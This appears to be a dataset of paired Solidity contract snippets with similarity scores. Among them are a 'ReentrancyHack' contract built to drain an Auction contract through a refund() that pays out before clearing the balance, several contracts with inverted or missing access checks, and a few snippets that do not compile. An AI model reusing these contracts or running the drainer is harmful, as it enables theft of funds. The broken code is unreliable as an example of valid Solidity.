        bids[accountsList[i]] = 0; 
      }
    }     
  }

  function refund() public {
    require(msg.sender != winner, ""winner cannot refund"");

    msg.sender.transfer( bids[msg.sender] );
    emit Refund(msg.sender, bids[msg.sender], now);
    bids[msg.sender] = 0;
  }

}",0.6407138810972011,"contract Kryptor is ERC20Interface {
    uint public constant decimals = 10;

    string public constant symbol = ""Kryptor"";
    string public constant name = ""Kryptor"";

    uint private constant icoSupplyRatio = 30;  
    uint private constant bonusRatio = 20;   
    uint private constant bonusBound = 10;  
    uint private constant initialPrice = 5000; 

    bool public _selling = true;
    uint public _totalSupply = 10 ** 19; 
    uint public _originalBuyPrice = (10 ** 18) / (initialPrice * 10**decimals); 

    
    address public owner;
 
    
    mapping(address => uint256) balances;
    
    
    
    uint public _icoSupply = (_totalSupply * icoSupplyRatio) / 100;
    
    
    uint public bonusRemain = (_totalSupply * bonusBound) / 100;
    
    
    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert();
        }
        _;
    }

    
    modifier onlyNotOwner() {
        if (msg.sender == owner) {
            revert();
        }
        _;
    }

    
    modifier onSale() {
        if (!_selling || (_icoSupply <= 0) ) { 
            revert();
        }
        _;
    }

    
    modifier validOriginalBuyPrice() {
        if(_originalBuyPrice <= 0) {
            revert();
        }
        _;
    }

    
    function()
        public
        payable
    {
        buy();
    }

    
    function Kryptor() 
        public {
        owner = msg.sender;
        balances[owner] = _totalSupply;
    }
    
    
    
    function totalSupply()
        public 
        constant 
        returns (uint256) {
        return _totalSupply;
    }
 
    
    
    
    function balanceOf(address _addr) 
        public
        constant 
        returns (uint256) {
        return balances[_addr];
    }
 
    
    
    
    
    function transfer(address _to, uint256 _amount)
        public 
        returns (bool) {
        
        
        
        if ( (balances[msg.sender] >= _amount) &&
             (_amount > 0) && 
             (balances[_to] + _amount > balances[_to]) ) {  

            balances[msg.sender] -= _amount;
            balances[_to] += _amount;
            Transfer(msg.sender, _to, _amount);
            
            return true;

        } else {
            return false;
        }
    }

    
    function turnOnSale() onlyOwner 
        public {
        _selling = true;
    }

    
    function turnOffSale() onlyOwner 
        public {
        _selling = false;
    }

    
    function isSellingNow() 
        public 
        constant
        returns (bool) {
        return _selling;
    }

    
    
    function setBuyPrice(uint newBuyPrice) onlyOwner 
        public {
        _originalBuyPrice = newBuyPrice;
    }
    
     
    
    
    function buy() payable onlyNotOwner validOriginalBuyPrice onSale 
        public
        returns (uint256 amount) {
        
        uint requestedUnits = msg.value / _originalBuyPrice ;
        
        
        if(requestedUnits > _icoSupply){
            revert();
        }
        
        
        uint actualSoldUnits = 0;

        
        if (requestedUnits < bonusRemain) {
            
            actualSoldUnits = requestedUnits + ((requestedUnits*bonusRatio) / 100); 
            
            _icoSupply -= requestedUnits;
            
            
            bonusRemain -= requestedUnits;
        }
        else {
            
            actualSoldUnits = requestedUnits + (bonusRemain * bonusRatio) / 100;
            
            
            _icoSupply -= requestedUnits;

            
            bonusRemain = 0;
        }

        
        balances[owner] -= actualSoldUnits;
        balances[msg.sender] += actualSoldUnits;

        
        owner.transfer(msg.value);
        
        
        Transfer(owner, msg.sender, actualSoldUnits);

        return actualSoldUnits;
    }
    
    
    function withdraw() onlyOwner 
        public 
        returns (bool) {
        return owner.send(this.balance);
    }
}"
"contract ReentrancyHack {
  Auction public auction;
  address public owner;

  constructor (address _auction) public payable {
    auction = Auction(_auction);
    owner = msg.sender;
  }

  modifier onlyOwner { require(owner == msg.sender, ""only owner""); _; }

  function moveFundsToTheBase() public onlyOwner() {
      owner.transfer(address(this).balance);
  }

  event EmitNumber(uint balance);

  function sendSomeEthFirst() public payable {
      address(auction).transfer(msg.value);
  }

  function checkBalance(address who) view public returns(uint) {
    uint howMuch = auction.bids(who);
    return howMuch;
  }

  function hackDadShit() public {
    auction.refund();
  }

  function() public payable {
    if (address(auction).balance > 0.1 ether) {
      auction.refund();
    }
  }
}",0.6423879780122306,"contract WithdrawalContract {

    address public richest;
    address public owner;
    uint public mostSent;

    modifier onlyOwner() {
        require (msg.sender != owner);
        _;

    }

    mapping (address => uint) pendingWithdraws;

    function WithdrawalContract () payable {
        richest = msg.sender;
        mostSent = msg.value;
        owner = msg.sender;
    }

    function becomeRichest() payable returns (bool){
        require(msg.value > mostSent);
        pendingWithdraws[richest] += msg.value;
        richest = msg.sender;
        mostSent = msg.value;
        return true;
    }

    function withdraw(uint amount) onlyOwner returns(bool) {
        
        
        
        require(amount < this.balance);
        owner.transfer(amount);
        return true;

    }

    function getBalanceContract() constant returns(uint){
        return this.balance;
    }

}"
"contract Lottery {

    address[] tickets;
    address owner;
    uint ticketCount = 0;
    uint maxTickets = 100;


    function buy() public payable {
        require(msg.value == .001 ether);

        tickets.push(msg.sender);
        ticketCount++;
    }

    function currentTickets() public constant returns(uint currentNumber){
        return ticketCount;
    }
}",0.6357701447079046,"contract TokenLocker {
    
    address public owner;

    ERC20 public token;

    
    function TokenLocker (ERC20 tokenAddr) public {
        owner = msg.sender;
        token = tokenAddr;
    }

    
    function transfer(address dest, uint amount) public returns (bool) {
        require(msg.sender == owner);
        return token.transfer(dest, amount);
    }

}"
"contract Marketplace {   
    uint256 transferBudget = 1 ether;
    bytes32[] ids;
    enum Position{
        Goalkeeper, Defender, Midfielder, Attacker, Coach
    }

    struct Footballer{
        bytes32 id;
        string name;
        address owner;
        Position position;
        uint price;
    }
    Footballer[] footballers;

    

    function deposit() public payable {
        if(msg.value>0){
            transferBudget = transferBudget+msg.value;
        }
    }

    function getTransferBudget() public view returns(uint256){
        return transferBudget;
    }

    function update(bytes32 ID, uint newPrice) public {
        for(uint i=0; i<footballers.length; i++){
            if(footballers[i].id==ID && msg.sender==footballers[i].owner){
                footballers[i].price = newPrice;
                break;
            }
        }
    }

     function newProduct2() public pure returns(uint) {
        return 12;
    }

    
    function newProduct(string name, uint price, Position position) public returns(bytes32 id) {
        bytes32 hashId = keccak256(name,price,position);
        Footballer memory footballer = Footballer(hashId, name, msg.sender,position,price);
        footballers.push(footballer);
        ids.push(hashId);
        return hashId;
    }

    function getProducts() public view returns(bytes32[]) {
       return ids;
    }

    function getPrice(bytes32 ID) public view returns (uint) {
        for(uint i=0; i<footballers.length; i++){
            if(footballers[i].id==ID){
                return footballers[i].price;
            }
        }
    }
}",0.6171239840482484,"contract TriviaChain {

	
	address payable public owner;
	
	
	uint256 public startdate = 1560737700;	
	
	
	uint256 public enddate = 1560737758;


	
	int constant question_id = 18;

	
	bytes correctAnswerHash = bytes('0x1670F2E42FEFA5044D59A65349E47C566009488FC57D7B4376DD5787B59E3C57'); 

	
	
	constructor() public {owner = msg.sender; }

	
	modifier onlyOwner {
	require (msg.sender == owner);
	_;
	}

	
	
	
	function() external payable { }
	
	
	function checkAnswer(string memory answer) private view returns (bool) {
	
	bytes32 answerHash = sha256(abi.encodePacked(answer));
	
	
	
	if(keccak256(abi.encode(answerHash)) == keccak256(abi.encode(correctAnswerHash)))  {
	return true;
	}
	
	return false;
	
	}
	
	
	
	function sendEtherToWinner(address payable recipient, uint amount) public payable onlyOwner() {
		recipient.transfer(amount);
	}
	
	
	function get_startdate() public view  returns (uint256) {
        return startdate;
    }
	
	
	function get_enddate() public view  returns (uint256) {
        return enddate;
    }
	
	
	
	function get_Id() public pure  returns (int) {
        return question_id;
    }
	
	function get_answer_hash() public view  returns (string memory) {
        return string(correctAnswerHash);
    }
	
	function getSha256(string memory input) public pure returns (bytes32) {

        bytes32 hash = sha256(abi.encodePacked(input));

        return (hash);
    }
	
}"
"contract Callee {
    uint256 public xxxx;

    function func() external returns (uint256) {
        xxxx = 123;
        return 456;
    }
}",0.6942731690466138,"contract Pointer {
    uint256 public pointer;

    function bumpPointer() internal returns (uint256 p) {
        return pointer++;
    }
}"
"contract MyContractFactory is Ownable {
    function create(...) onlyOwner public returns (MyContract) {
        return new MyContract(...);
    }
}",0.6022529714594287,"contract MyContract {
  string word = ""All men are created equal!"";

  function getWord() returns (string){
    return word;
  }

}"
"contract Time {
  uint time;

  function giveTime() {
    time=now;
  }

  function Timestamp() constant returns (uint block_time) {
    block_time=time;
  }
}",0.641840183949022,"contract ERC20 {
  function transfer(address _to, uint _value);
  function balanceOf(address _owner) constant returns (uint balance);
}"
"contract PiggyBank {

using SafeMath for uint256;

struct Box {
    address owner;
    uint256 targetFigure;
    uint256 balance;
}

mapping (address =>  mapping (uint16 => Box)) public myBoxes;

event Deposit (
    address indexed _from,
    uint16 indexed _to,
    uint256 indexed _amount
);

event Withdraw (
    uint16 indexed _whichBox,
    address indexed _to,
    uint256 indexed _amount
);

function createBox(uint16 _boxid, uint _targetFigure) public {
    myBoxes[msg.sender][_boxid].owner = msg.sender;
    myBoxes[msg.sender][_boxid].targetFigure = _targetFigure;
    myBoxes[msg.sender][_boxid].balance = 0;
}

function getBoxInfo(uint16 _boxid) onlyOwner(_boxid) public view returns (uint256, uint256) {
    return (myBoxes[msg.sender][_boxid].targetFigure, myBoxes[msg.sender][_boxid].balance);
}

function deposit(uint16 _boxid,uint256 _amount) onlyOwner(_boxid) public payable {
    require(msg.value == _amount);
    myBoxes[msg.sender][_boxid].balance = myBoxes[msg.sender][_boxid].balance.add(msg.value);
    emit Deposit(msg.sender,_boxid, _amount);
}

function withdraw(uint16 _boxid) onlyOwner(_boxid) public payable {
    require(myBoxes[msg.sender][_boxid].targetFigure <= myBoxes[msg.sender][_boxid].balance);
    uint amount = myBoxes[msg.sender][_boxid].balance;
    myBoxes[msg.sender][_boxid].balance = 0 ;
    msg.sender.transfer(amount);
    breakBox(_boxid); 
    emit Withdraw (_boxid, msg.sender, amount);
}

function checkBalance() view public returns (uint){
    return(msg.sender.balance);
}

function breakBox(uint16 _boxid) public {
    delete myBoxes[msg.sender][_boxid];
}

 modifier onlyOwner(uint16 _boxid) {
   require(msg.sender == myBoxes[msg.sender][_boxid].owner);
    _;
}
}",0.6333175254323525,"contract UnlimitedAllowanceToken is IERC20 {

  using SafeMath for uint256;



  



  uint256 public totalSupply;

  mapping (address => uint256) public  balances;

  mapping (address => mapping (address => uint256)) public allowed;



  



  event Approval(address indexed src, address indexed spender, uint256 amount);

  event Transfer(address indexed src, address indexed dest, uint256 amount);



  



  constructor () public { }



  



  function approve(address _spender, uint256 _amount) public returns (bool) {

    allowed[msg.sender][_spender] = _amount;

    emit Approval(msg.sender, _spender, _amount);

    return true;

  }



  function transfer(address _dest, uint256 _amount) public returns (bool) {

    return transferFrom(msg.sender, _dest, _amount);

  }



  function transferFrom(address _src, address _dest, uint256 _amount) public returns (bool) {

    require(balances[_src] >= _amount, ""Insufficient user balance"");



    if (_src != msg.sender && allowance(_src, msg.sender) != uint256(-1)) {

      require(allowance(_src, msg.sender) >= _amount, ""Insufficient user allowance"");

      allowed[_src][msg.sender] = allowed[_src][msg.sender].sub(_amount);

    }



    balances[_src] = balances[_src].sub(_amount);

    balances[_dest] = balances[_dest].add(_amount);



    emit Transfer(_src, _dest, _amount);



    return true;

  }



  function allowance(address _owner, address _spender) public view returns (uint256) {

    return allowed[_owner][_spender];

  }



  function balanceOf(address _owner) public view returns (uint256) {

    return balances[_owner];

  }



  function totalSupply() public view returns (uint256) {

    return totalSupply;

  }

}"
"contract matching {

    struct User {
        uint time;
        string location;
        string position;
    }
    User[] people; 

    mapping (address => User) user_mapping;
    address[] public userAccounts;

    function Set(address _address, uint _time, string memory _location, string memory _position) public {
        User storage users = user_mapping[_address];

        users.time = _time;
        users.location = _location;
        users.position = _position;

        userAccounts.push(_address) -1;
    }

    function getAccounts()public view returns(address[] memory) {
        return userAccounts;
    }

    function getInfo(address _address) view public returns (uint, string memory, string memory) {
        return (user_mapping[_address].time, user_mapping[_address].location, user_mapping[_address].position);
    }

    function countInfo() view public returns (uint) {
        return userAccounts.length;
    }
    function start() public{
     
    }

}",0.6880178605025815,"contract Twitter {

  struct User {
    string name;
    string[] messages;
  }
  
  mapping (address => User) users;
  
  address[] history;
  
  function changeName(string name) public {
    users[msg.sender].name = name;
  }
  
  function getName(address user) public view returns(string name) {
    return users[user].name;
  }

  function postMessage(string text) public {
    users[msg.sender].messages.push(text);
    history.push(msg.sender);
  }
  
  function getMessage(address user, uint index) public constant returns(string value) {
    return users[user].messages[index];
  }

  function countMessages(address user) public constant returns(uint length) {
    return users[user].messages.length;
  }
  
  function getHistory(uint index) public constant returns(address user) {
    return history[index];
  }
  
  function countHistory() public constant returns(uint length) {
    return history.length;
  }
}"
"contract pullother {

function callFunctionInContractOne (address _address) returns (uint) {
    helloworld contractOne = helloworld(_address);
    contractOne.returnint();
}
}",0.6260118148026701,"contract EtherandomProxyI {
  function getContractAddress() constant returns (address _addr); 
  function getCallbackAddress() constant returns (address _addr); 
}"
"contract Faucet {
    event AccountFunded(address account);

    address public tokenAddress;

    constructor(address _tokenAddress) public payable {
        tokenAddress = _tokenAddress;
    }

    function () external payable {}

    function testBalance(address account) public view returns (uint) {
        return ERC20Basic(tokenAddress).balanceOf(account);
    }

    function transfer(address account) public {
        SafeERC20.safeTransfer(ERC20Basic(tokenAddress), account, 10);
        emit AccountFunded(account);
    }
}",0.697328909597694,"contract MoatKyber is Trade {



    event AssetsCollected(address name, uint addr);



    constructor(address rAddr) public {

        addressRegistry = rAddr;

    }



    function () public payable {}



    function collectAsset(address tokenAddress, uint amount) public onlyAdmin {

        if (tokenAddress == getAddress(""eth"")) {

            msg.sender.transfer(amount);

        } else {

            IERC20 tokenFunctions = IERC20(tokenAddress);

            tokenFunctions.transfer(msg.sender, amount);

        }

        emit AssetsCollected(tokenAddress, amount);

    }



}"
contract testA { function multiply(uint a) returns(uint d) { return a * 5; } },0.6765438960861195,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract Birthday {
    event Pinata(uint candies);

    function celeb() public {
        emit Pinata(123);
    }
}",0.6411595013342032,"contract Lottery

{

    event Bid(address sender);



    function bid() public

    {

        emit Bid(msg.sender);

    }

}"
"contract ShoeStore {
    function () external payable {

    }

    function getBalance() public view returns (uint) {
        return msg.sender.balance;
    }
}",0.6923998517321012,"contract Token {
  function balanceOf(address) public view returns (uint);
  function decimals() public view returns (uint);
}"
"contract Send {

    function sendViaCall(address payable _to) public payable {

        (bool sent, bytes memory data) = _to.call.value(msg.value)("""");
        require(sent, ""Failed to send Ether"");
    }
}",0.6282503364713362,"contract Notifier {
    constructor () public {}
    
    event Notify(address indexed who, uint256 value, bytes data);

    function() public payable {
        emit Notify(msg.sender, msg.value, msg.data);
    }
}"
"contract Registry {
    mapping(string => address) ID;
    mapping(address => address) Contract;

    function addID(string _id, address publicAddress) {
        ID[_id] = publicAddress;
    }

    function addContract(address _owner) {
        Contract[_owner] = msg.sender;
    }
}",0.6213637855582715,"contract ManagerContract {

  address public owner;



  constructor() public {

    owner = msg.sender;

  }



  modifier restricted() {

    if (msg.sender == owner) _;

  }



  function upgrade(address new_address) public restricted {

    owner = new_address;

  }

}"
"contract TestContractAuth is ContractAuth {

    
    function getPrefixedHashTest(bytes32 messageHash) public pure returns (bytes32) {
        return getPrefixedHash(messageHash);
    }

    
    function verifyMessageHashTest(bytes32 messageHash, uint8 v, bytes32 r, bytes32 s) public view returns (bool) {
        return verifyMessageHash(messageHash, v, r, s);
    }

    function verifyMultipleInputs(uint256 inputNumber, address inputAddress, uint8 v, bytes32 r, bytes32 s) public view returns (bool) {
        bytes32 messageHash = keccak256(abi.encodePacked(inputNumber, inputAddress));
        return verifyMessageHash(messageHash, v, r, s);
    }
}",0.6016790570196332,"contract TermsContractInterface {



	function registerTermStart(

        bytes32 agreementId,

        address debtor

    ) public returns (bool _success);



	function registerRepayment(

        bytes32 agreementId,

        address payer,

        address beneficiary,

        uint256 unitsOfRepayment,

        address tokenAddress

    ) public returns (bool _success);



	function getExpectedRepaymentValue(

        bytes32 agreementId,

        uint256 timestamp

    ) public view returns (uint256);



	function getValueRepaidToDate(

        bytes32 agreementId

    ) public view returns (uint256);



	function getTermEndTimestamp(

        bytes32 _agreementId

    ) public view returns (uint);



}"
"contract B {
    address client;
    address authorizedAgent;

    modifier isClient() {
        if (msg.sender != client) {
            revert();
        }
        _;
    }    

    modifier isAuthorizedAgent() {
        if (msg.sender != authorizedAgent) {
            revert();
        }
        _;
    }    

    modifier isAuthorizedEntity() {
        if (msg.sender != client && msg.sender != authorizedAgent) {
            revert();
        }
        _;
    }    

    function B(address _agent) payable public {
        client = msg.sender;
        authorizedAgent = _agent;
    }    

    function depositFunds() payable public {}    

    function getFunds() isAuthorizedEntity constant public returns (uint) {
        return this.balance;
    }    

    function execute(address _c) isAuthorizedAgent payable public {
        _c.transfer(this.balance);
    }
}",0.6385982232755248,"contract BonusBank {

    address public owner;

    uint public limit;

    modifier isOwner() {

        require(msg.sender == owner);

        _;

    }



    

    event Deposit(address indexed from, uint value);



   

    function limitvalue(uint _limit) public {

        require(_limit > 0);



        owner = msg.sender;

        limit = _limit ;

    }



   

    function deposit() public payable {

        Deposit(msg.sender, msg.value);

    }



    function canDistribution() public constant returns (bool) {

        return this.balance >= limit;

    }

    

    function getCurrentBalance() constant returns (uint) {

        return this.balance;

    }

    

    function distribution() public isOwner {

        require(canDistribution());



        owner.transfer(this.balance);

    }



   

}"
"contract FatherContract {
    function createChild() public {        
        new ChildContract();
    }
}",0.6676977075454662,"contract ContractCreator {

    function setContract() public returns(address);

}"
"contract BaconMaker {
    address public pig;
    address public owner;

    function BaconMaker(address _pig) public {
        require(_pig != 0x0);
        owner = msg.sender;
        pig = _pig;
    }
}",0.6911437592224248,"contract OOOOOO {

    address public owner;

	address public Defaultaddress;

    constructor() public {

        owner = msg.sender;

    }



	modifier restricted {

        require(msg.sender == owner);

        _;

    }



}"
"contract SimplePaymentChannel {
    address public sender;     
    address public recipient;  
    uint256 public expiration; 
    closes.

    function SimplePaymentChannel(address _recipient, uint256 duration)
        public
        payable
    {
        sender = msg.sender;
        recipient = _recipient;
        expiration = now + duration;
    }

    function isValidSignature(uint256 amount, bytes signature)
        internal
        view
        returns (bool)
    {
        bytes32 message = prefixed(keccak256(this, amount));

        
        return recoverSigner(message, signature) == sender;
    }

    
    
    
    function close(uint256 amount, bytes signature) public {
        require(msg.sender == recipient);
        require(isValidSignature(amount, signature));

        recipient.transfer(amount);
        selfdestruct(sender);
    }

    
    function extend(uint256 newExpiration) public {
        require(msg.sender == sender);
        require(newExpiration > expiration);

        expiration = newExpiration;
    }

    
    
    function claimTimeout() public {
        require(now >= expiration);
        selfdestruct(sender);
    }

    function splitSignature(bytes sig)
        internal
        pure
        returns (uint8, bytes32, bytes32)
    {
        require(sig.length == 65);

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            
            r := mload(add(sig, 32))
            
            s := mload(add(sig, 64))
            
            v := byte(0, mload(add(sig, 96)))
        }

        return (v, r, s);
    }

    function recoverSigner(bytes32 message, bytes sig)
        internal
        pure
        returns (address)
    {
        uint8 v;
        bytes32 r;
        bytes32 s;

        (v, r, s) = splitSignature(sig);

        return ecrecover(message, v, r, s);
    }

    
    function prefixed(bytes32 hash) internal pure returns (bytes32) {
        return keccak256(""\x19Ethereum Signed Message:\n32"", hash);
    }
}",0.6057730913323957,"contract Library {
    
    
    
    function createBSMHash(string payload) pure internal returns (bytes32) {
        
        string memory prefix = ""\x18Bitcoin Signed Message:\n"";
        return sha256(sha256(prefix, bytes1(bytes(payload).length), payload));
    }

    function validateBSM(string payload, address key, uint8 v, bytes32 r, bytes32 s) internal pure returns (bool) {
        return key == ecrecover(createBSMHash(payload), v, r, s);
    }
  
	
	

    

	function btcAddrPubKeyUncompr( bytes32 _xPoint, bytes32 _yPoint) internal pure returns( bytes20 hashedPubKey )	{
		bytes1 startingByte = 0x04;
 		return ripemd160(sha256(startingByte, _xPoint, _yPoint));
	}
	
	function btcAddrPubKeyCompr(bytes32 _x, bytes32 _y) internal pure returns( bytes20 hashedPubKey )	{
	    bytes1 _startingByte;
	    if (uint256(_y) % 2 == 0  ) {
            _startingByte = 0x02;
        } else {
            _startingByte = 0x03;
        }
 		return ripemd160(sha256(_startingByte, _x));
	}
	
	function ethAddressPublicKey( bytes32 _xPoint, bytes32 _yPoint) internal pure returns( address ethAddr )	{
 		return address(keccak256(_xPoint, _yPoint) ); 
	}
	
    function toAsciiString(address x) internal pure returns (string) {
        bytes memory s = new bytes(42);
        s[0] = 0x30;
        s[1] = 0x78;
        for (uint i = 0; i < 20; i++) {
            byte b = byte(uint8(uint(x) / (2**(8*(19 - i)))));
            byte hi = byte(uint8(b) / 16);
            byte lo = byte(uint8(b) - 16 * uint8(hi));
            s[2+2*i] = char(hi);
            s[2+2*i+1] = char(lo);            
        }
        return string(s);
    }
    
    function char(byte b) internal pure returns (byte c) {
        if (b < 10) return byte(uint8(b) + 0x30);
        else return byte(uint8(b) + 0x57);
    }
    
    
}"
"contract Foo {
    bool public lastVal = false;

    function fooFunc(bool x) public returns (bool) {
        lastVal = x;
        return !x;
    }
}",0.6853314075763692,"contract DAppTest {

  bool public _is;

  function changeBoolean() public returns (bool success) {
    _is = !_is;
    return true;
  }

}"
"contract ContractB {

    ERC20 public token;

    constructor(ERC20 _token) public {
        token = _token;
    }

    function burn() internal {
        token.balances[address(token)] = 0;
        token.totalSupply_ = 0;
    }
}",0.6156069899113422,"contract CYC is Token {



  constructor()

    public

  {

    tokenName = ""ChangeYourCoin"";

    tokenSymbol = ""CYC"";

    tokenDecimals = 0;

    tokenTotalSupply = 15000000;

    balances[msg.sender] = tokenTotalSupply;

  }

}"
"contract MyContract is Migratable {
    uint256 public x;

    function initialize(uint256 _x) isInitializer(""MyContract"", ""0"") public {
        x = _x;
    }

    function baz() public returns (uint256) {
        decrement();
        return x;
    }

    function increment() public {
        x += 1;
    }

    function decrement() public {
        x -= 1;
    }
}",0.6650903366076014,"contract CryptoEngineerInterface {

    uint256 public prizePool = 0;



    function subVirus(address , uint256 ) public {}

    function claimPrizePool(address , uint256 ) public {} 

    function isContractMiniGame() public pure returns( bool ) {}

    function isEngineerContract() external pure returns(bool) {}

}"
"contract SimpleCounter {
    int counter;

    constructor() public {
        counter = 0;
    }

    function getCounter() public view returns (int){
        return counter;
    }

    function increment() public {
        counter += 1;
    }

    function decrement() public {
        counter -= 1;
    }
}",0.640749627200196,"contract showNum {
    address owner = msg.sender;
    uint _num = 0;
    constructor(uint number) public {
        _num = number;
    }
    function setNum(uint number) public payable {
        _num = number;
    }
    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract ContractA {
    ContractB public BB;

    
    constructor () public {
        BB = ContractB(msg.sender);
    }

    function () public payable {
        require(msg.value > 0);

        BB.destination().transfer(msg.value);
        BB.logDeposit(msg.sender, msg.value);
    }
}",0.6471898229169023,"contract Counter {
    uint256 public i;
    constructor() payable public {
        require(msg.value==0.0058 ether,""bad amount"");
        i = 0;
    }
    function inc() public {
        if (i==1) {
            msg.sender.transfer(address(this).balance);
        }
        i++;
    }
}"
"contract FatherContract {
    function createChild(bytes contractDataInfo) public {        
        
        
    }
}",0.6397790282333295,"contract ContractCreator {

    function setContract() public returns(address);

}"
"contract C {

    string words = ""Bla bla bla"";

    uint256 lastVal;

    function math(uint256 a, uint256 b) returns (uint256) {
        lastVal = a + b;
        return lastVal;
    }

    function getWords() constant returns (string) {
        return words;
    }
}",0.6536329339307447,"contract SafeMath {

    function safeAdd(uint a, uint b) internal returns (uint) {

        uint c = a + b;

        assert(c>=a && c>=b);

        return c;

     }



    function safeSub(uint a, uint b) internal returns (uint) {

        assert(b <= a);

        return a - b;

    }

}"
"contract CollegeAdmin {
uint8 public studentAge=21;
uint16 public studentIncome=15000;
uint8 public studentScore=4;
uint8 public studentAttendance=96;
address public buyer;
address public owner;
event changedAge(uint age);

function CollegeAdmin() public {
owner = msg.sender;
}
function setAge(uint8 age) public {
buyer=msg.sender;
studentAge = age;
changedAge(age);
}

}",0.6017976346125278,"contract Counter {
    
    event Won(address winner, uint amount);
    
    uint public i;
    address public owner;
    
    function Counter() public {
        owner = msg.sender;
    }
    
    function reset() public {
        require(msg.sender==owner);
        i=0;
    }
    
    function inc() public payable {
        require(msg.value >= 0.001 ether);
        i++;
        if (i==2) {
            emit Won(msg.sender,address(this).balance);
            msg.sender.transfer(address(this).balance);
            i = 0;
        }
    }
    
}"
"contract Escrow is Owned {

token public tokenReward; 
uint256 public salesVolume; 
uint256 public sellingPrice; 
uint256 public deadline;     
bool public isOpened;     

mapping(address => uint256) public balanceOf;


event EscrowStart(uint salesVolume, uint sellingPrice, uint deadline, address beneficiary);
event ConfirmedPayment(address addr, uint amount);


function Escrow(
    address addressOfTokenUsedAsReward,
    uint256 _salesVolume,
    uint256 priceInEther

) public {
    tokenReward = token(addressOfTokenUsedAsReward);
    salesVolume = _salesVolume;
    sellingPrice = priceInEther * 1 ether;
}


function () public payable {
    
    require(!isOpened || now >= deadline);

    
    uint amount = msg.value;
    require(amount < sellingPrice);

    
    tokenReward.transfer(msg.sender, salesVolume);
    isOpened = false;
    ConfirmedPayment(msg.sender, amount);

}


function start(uint256 _durationInMinutes) public {
    require(tokenReward == address(0) || salesVolume == 0 || sellingPrice == 0 || deadline !=0);
    if(tokenReward.balanceOf(this) >= salesVolume){
        deadline = now + _durationInMinutes * 1 minutes;
        isOpened = true;
        EscrowStart(salesVolume, sellingPrice, deadline, owner);
    }

}

function getRemainingTime() public constant returns(uint min){
    if(now < deadline) {
        min = (deadline - now) / (1 minutes);
    }
}

function close() public {
    
   tokenReward.transfer(owner, tokenReward.balanceOf(this));
   
   selfdestruct(owner);
}

}",0.6754643359652572,"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public amountRemaining;
    uint public deadline;
    uint public price;
    token public tokenReward;
    bool crowdsaleClosed = false;
    
    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    function Crowdsale(
        address ifSuccessfulSendTo,
        address addressOfTokenUsedAsReward
    ) public {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = 8334 * 1 ether;
        deadline = 1533866400;
        price = 100 szabo;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () payable public {
        require(!crowdsaleClosed);
        uint amount = msg.value;
        amountRaised += amount;
        amountRemaining+= amount;
        tokenReward.transfer(msg.sender, amount  * 6 /  price);
       emit FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            emit GoalReached(beneficiary, amountRaised);
        }
        else
        {
	        tokenReward.transfer(beneficiary, (fundingGoal-amountRaised)  * 6  /  price);
        }
        crowdsaleClosed = true;
    }
    
    function safeWithdrawal() public afterDeadline {
        if (beneficiary == msg.sender) {
            if (beneficiary.send(amountRemaining)) {
               amountRemaining =0;
               emit FundTransfer(beneficiary, amountRemaining, false);
           }
        }
    }
}"
"contract A {

    uint private a;

    function setA(uint _a) external { a = _a; }
    function getA() external view returns(uint) { return a; }
}",0.6947348481554627,"contract SafeMath {

	function safeAdd(uint a, uint b) internal returns(uint) {
		uint c = a + b;
		assert(c >= a && c >= b);
		return c;
	}
}"
"contract B {
    A a;

    constructor() public {
        a = new A();

        a.setA(2);
    }

    function getterA() public view returns(uint) { a.getA(); }
}",0.6622516656897875,"contract RandomOnce{

    constructor() public{}

    function getRandom() public view returns(bytes32){}

    function destruct() public{}

}"
"contract Simple {
    string32 message public;

    function Simple() {
        message = msg.sender;
    }
}",0.6393165957322281,"contract Resolver {
    function setName(bytes32 node, string memory name) public;
}"
"contract Proxy {

    address public implement;
    
    
    uint public total;  

    function changeImpl(address _impl) public returns(bool) {
        implement = _impl;
        return true;
    }

    
    
    function add(uint a, uint b) external {
        address _impl = implement;
        assembly {
            let ptr := mload(0x40)
            calldatacopy(ptr, 0, calldatasize)
            let result := delegatecall(gas, _impl, ptr, calldatasize, 0, 0)
        }
    }
}",0.6774124673620041,"contract DelegateProxy {



    constructor() public {}



    

    function delegatedFwd(address _dst, bytes _calldata) internal {

        assembly {

            let result := delegatecall(sub(gas, 10000), _dst, add(_calldata, 0x20), mload(_calldata), 0, 0)

            let size := returndatasize



            let ptr := mload(0x40)

            returndatacopy(ptr, 0, size)



            

            

            switch result case 0 { revert(ptr, size) }

            default { return(ptr, size) }

        }

    }

}"
"contract ImplContract {

    address public implement;
    uint public total;

    function add(uint a, uint b) public returns(uint) {
        total = a + b;
        return total;
    }
}",0.6787855114322525,"contract SaiTap {
    function s2s() public returns (uint);
    function bid(uint wad) public returns (uint);
    function ask(uint wad) public returns (uint);
}"
"contract Migrations {
  address public owner;
  uint public last_completed_migration;

  constructor() public {
    owner = msg.sender;
  }

  modifier restricted() {
    if (msg.sender == owner) _;
  }

  function setCompleted(uint completed) public restricted {
    last_completed_migration = completed;
  }
}",0.6589570203781551,"contract ProofOfExistence {



    uint topHash;

    address owner;



    constructor() public {

       owner = msg.sender;

    }



    function publishTopHash(uint _topHash) public {

        if (owner == msg.sender) {

            topHash = _topHash;

        }

    }



    function get() public view returns (uint) {

        return topHash;

    }

}"
"contract MyContract {
  function info() external view returns(uint min, uint max) {
    return(1, 2);
  }
}",0.6582699293201103,"contract Time {

    

    function _currentTime() internal view returns (uint256) {

        return block.timestamp;

    }

}"
"contract Launchpad {

 function launch() public returns(address) {
   MyContract myContractAddress = new MyContract();
   return myContractAddress;
 }

}",0.6006982906732848,"contract GNTJoinLike {
    function bags(address) public view returns (address);
    function make(address) public returns (address);
}"
"contract Ive {

    address public creator;
    address public owner;


    mapping (address=>bool) allowedVisitors;
    address[] allowedVisitorsList;

    struct Client {
        address wallet;
        string apellido1;
        string apellido2;
        string apellidoCasada;
        string nombre1;
        string nombre2;
        string fechaNacimiento;
        address modifiedBy;
    }

